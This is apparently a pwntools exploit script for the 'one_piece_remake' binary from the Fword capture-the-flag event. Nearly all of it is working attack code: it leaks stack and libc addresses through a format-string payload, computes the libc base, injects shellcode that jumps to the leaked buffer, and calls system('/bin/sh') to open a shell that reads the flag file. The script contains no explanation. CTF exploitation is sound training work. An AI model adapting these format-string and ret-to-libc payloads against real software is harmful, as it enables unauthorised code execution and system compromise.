#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host onepiece.fword.wtf --port 1236 ./one_piece_remake
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./one_piece_remake')
context.terminal = ['tmux', 'splitw', '-h']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'onepiece.fword.wtf'
port = int(args.PORT or 1236)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''

b *runSC+22
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
libc = ELF('libc6_2.30-0ubuntu2.1_i386.so')
io = start()
io.sendline('gomugomunomi')
io.sendline(b'#%p#%11$p#')
io.recvuntil('#')
buffer_adr = int(io.recvuntil('#')[:-1], 16)
log.success('buffer @ {}'.format(hex(buffer_adr)))

libc_leak = int(io.recvuntil('#')[:-1], 16)
libc.address = libc_leak -0x6fdb1
log.success('libc base @ {}'.format(hex(libc.address)))
io.recvuntil('>>')
io.sendline('read')
shellcode = "jmp {}".format(hex(buffer_adr))
io.sendline(asm(shellcode,vma=0x804a038))
io.recvuntil('>>')
io.sendline('gomugomunomi')
io.recvuntil('pirate ?')
shellcode = "push {}; push {}; push {}; ret".format(hex(next(libc.search(b'/bin/sh\x00'))), hex(0xdeadc0de), hex(libc.sym['system']))
log.warning(len(asm(shellcode)))
io.sendline(asm(shellcode))
io.recvuntil('>>')
io.sendline('run')
io.recvuntil('>>')
io.sendline('grep Fword flag.txt')
io.interactive()
